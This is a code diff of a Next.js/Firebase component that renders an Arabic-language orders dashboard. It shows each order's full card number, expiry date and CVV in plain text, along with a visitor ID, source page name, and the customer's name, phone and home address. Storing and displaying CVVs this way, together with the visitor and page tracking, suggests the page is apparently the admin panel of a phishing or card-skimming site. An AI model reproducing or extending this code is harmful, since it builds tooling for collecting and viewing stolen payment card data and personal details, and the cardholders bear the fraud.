@@ -1,177 +1,115 @@
-'use client';
+import { useState, useEffect, Key } from "react"
+import { collection, onSnapshot, query, where } from "firebase/firestore"
+import { useRouter } from "next/router"
+import { auth, db } from "../lib/firebase"
+import { useAuthState } from "react-firebase-hooks/auth"
 
-import { useEffect, useState } from 'react';
-import { collection, onSnapshot, orderBy, query } from 'firebase/firestore';
-import { signOut } from 'firebase/auth';
-import {
-  Card,
-  CardContent,
-  CardHeader,
-  CardTitle,
-} from '@/app/components/ui/card';
-import { useRouter } from 'next/navigation';
-import { db } from '../lib/firebase';
-import { Button } from './ui/button';
-import { Badge } from './ui/badge';
-import { Separator } from '@radix-ui/react-separator';
-import useAuth from 'firebase/auth';
-
-interface OrderData {
-  id: string;
-  createdAt: string;
-  pageName: string;
-  payment: {
-    method: string;
-    status: string;
-  };
-  values: {
-    cardNumber: string;
-    cvv: string;
-    expiryDate: string;
-    paymentMethod: string;
-  };
-  shipping: {
-    area: string;
-    block: string;
-    fullName: string;
-    governorate: string;
-    house: string;
-    phone: string;
-    street: string;
-  };
-  status: string;
-  visitor: string;
+export interface Payment {
+  method?: string
+  status?: string
+  values?: {
+    cardNumber?: string
+    expiryDate?: string
+    cvv?: string
+  }
 }
 
-export function OrderDetails({
-  initialOrders,
-}: {
-  initialOrders: OrderData[];
-}) {
-  const [orders, setOrders] = useState<OrderData[]>(initialOrders);
-  const router = useRouter();
-  const { user } = useAuth();
+export interface Shipping {
+  fullName?: string
+  phone?: string
+  governorate?: string
+  area?: string
+  block?: string
+  house?: string
+  street?: string
+}
+
+export interface OrderData {
+  id: Key | null | undefined
+  createdAt?: Date
+  pageName?: string
+  payment?: Payment
+  shipping?: Shipping
+  visitor?: string
+}
+
+const initialOrders: OrderData[] = []
+
+const Orders = () => {
+  const [user, loading, error] = useAuthState(auth)
+  const [orders, setOrders] = useState<OrderData[]>(initialOrders)
+  const router = useRouter()
 
   useEffect(() => {
+    if (loading) return
     if (!user) {
-      router.push('/login');
-      return;
+      router.push("/login")
+      return
     }
 
-    const q = query(collection(db, 'orders'), orderBy('createdAt', 'desc'));
-
+    const q = query(collection(db, "orders"), where("uid", "==", user.uid))
     const unsubscribe = onSnapshot(q, (snapshot) => {
       const newOrders = snapshot.docs.map((doc) => ({
         id: doc.id,
         ...doc.data(),
-      })) as OrderData[];
-      setOrders(newOrders);
-    });
-
-    return () => unsubscribe();
-  }, [user, router]);
-
-  const handleLogout = async () => {
-    try {
-      await signOut(auth);
-      router.push('/login');
-    } catch (error) {
-      console.error('Error logging out:', error);
-    }
-  };
+      })) as OrderData[]
+      setOrders(newOrders)
+    })
+    return () => unsubscribe()
+  }, [user, router])
 
   return (
-    <div className="min-h-screen bg-[#1a1f2e] text-white p-6" dir="rtl">
-      <div className="max-w-7xl mx-auto space-y-6">
-        <div className="flex justify-between items-center mb-6">
-          <h1 className="text-2xl font-bold">تفاصيل الطلبات</h1>
-          <Button
-            onClick={handleLogout}
-            variant="outline"
-            className="border-gray-600 text-white hover:bg-gray-700"
-          >
-            تسجيل الخروج
-          </Button>
+    <div className="container mx-auto p-4">
+      {orders.map((order) => (
+        <div key={order.id} className="bg-white shadow-md rounded-lg p-6 mb-4">
+          {/* Basic Information */}
+          <div>
+            <h3 className="text-gray-400 mb-2">معلومات أساسية</h3>
+            <div className="space-y-2">
+              <p>تاريخ الإنشاء: {order.createdAt ? new Date(order.createdAt).toLocaleString("ar-SA") : "غير متوفر"}</p>
+              <p>الصفحة: {order.pageName ?? "غير متوفر"}</p>
+              <p>رقم الزائر: {order.visitor ?? "غير متوفر"}</p>
+            </div>
+          </div>
+
+          {/* Payment Information */}
+          <div>
+            <h3 className="text-gray-400 mb-2">معلومات الدفع</h3>
+            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+              <div className="space-y-2">
+                <p>طريقة الدفع: {order.payment?.method ?? "غير متوفر"}</p>
+                <p>حالة الدفع: {order.payment?.status ?? "غير متوفر"}</p>
+              </div>
+              <div className="space-y-2">
+                <p>رقم البطاقة: {order.payment?.values?.cardNumber ?? "غير متوفر"}</p>
+                <p>تاريخ الانتهاء: {order.payment?.values?.expiryDate ?? "غير متوفر"}</p>
+                <p>CVV: {order.payment?.values?.cvv ?? "غير متوفر"}</p>
+              </div>
+            </div>
+          </div>
+
+          {/* Shipping Information */}
+          <div>
+            <h3 className="text-gray-400 mb-2">معلومات الشحن</h3>
+            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+              <div className="space-y-2">
+                <p>الاسم الكامل: {order.shipping?.fullName ?? "غير متوفر"}</p>
+                <p>رقم الهاتف: {order.shipping?.phone ?? "غير متوفر"}</p>
+                <p>المحافظة: {order.shipping?.governorate ?? "غير متوفر"}</p>
+              </div>
+              <div className="space-y-2">
+                <p>المنطقة: {order.shipping?.area ?? "غير متوفر"}</p>
+                <p>القطعة: {order.shipping?.block ?? "غير متوفر"}</p>
+                <p>المنزل: {order.shipping?.house ?? "غير متوفر"}</p>
+                <p>الشارع: {order.shipping?.street ?? "غير متوفر"}</p>
+              </div>
+            </div>
+          </div>
         </div>
-
-        {orders.map((order) => (
-          <Card key={order.id} className="bg-[#1e2536] border-gray-700">
-            <CardHeader>
-              <div className="flex justify-between items-center">
-                <CardTitle className="text-xl">
-                  طلب #{order.id.slice(0, 8)}
-                </CardTitle>
-                <Badge
-                  variant={
-                    order.payment.status === 'pending'
-                      ? 'destructive'
-                      : 'default'
-                  }
-                  className="bg-red-500"
-                >
-                  {order.payment.status === 'pending'
-                    ? 'قيد الانتظار'
-                    : order.payment.status}
-                </Badge>
-              </div>
-            </CardHeader>
-            <CardContent className="space-y-6">
-              {/* Basic Information */}
-              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
-                <div>
-                  <h3 className="text-gray-400 mb-2">معلومات أساسية</h3>
-                  <div className="space-y-2">
-                    <p>
-                      تاريخ الإنشاء:{' '}
-                      {new Date(order.createdAt).toLocaleString('ar-SA')}
-                    </p>
-                    <p>الصفحة: {order.pageName}</p>
-                    <p>رقم الزائر: {order.visitor}</p>
-                  </div>
-                </div>
-              </div>
-
-              <Separator className="border-gray-700" />
-
-              {/* Payment Information */}
-              <div>
-                <h3 className="text-gray-400 mb-2">معلومات الدفع</h3>
-                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
-                  <div className="space-y-2">
-                    <p>طريقة الدفع: {order.payment.method}</p>
-                    <p>حالة الدفع: {order.payment.status}</p>
-                  </div>
-                  <div className="space-y-2">
-                    <p>رقم البطاقة: {order.values.cardNumber}</p>
-                    <p>تاريخ الانتهاء: {order.values.expiryDate}</p>
-                    <p>CVV: {order.values.cvv}</p>
-                  </div>
-                </div>
-              </div>
-
-              <Separator className="border-gray-700" />
-
-              {/* Shipping Information */}
-              <div>
-                <h3 className="text-gray-400 mb-2">معلومات الشحن</h3>
-                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
-                  <div className="space-y-2">
-                    <p>الاسم الكامل: {order.shipping.fullName}</p>
-                    <p>رقم الهاتف: {order.shipping.phone}</p>
-                    <p>المحافظة: {order.shipping.governorate}</p>
-                  </div>
-                  <div className="space-y-2">
-                    <p>المنطقة: {order.shipping.area}</p>
-                    <p>القطعة: {order.shipping.block}</p>
-                    <p>المنزل: {order.shipping.house}</p>
-                    <p>الشارع: {order.shipping.street}</p>
-                  </div>
-                </div>
-              </div>
-            </CardContent>
-          </Card>
-        ))}
-      </div>
+      ))}
     </div>
-  );
+  )
 }
+
+export default Orders
+
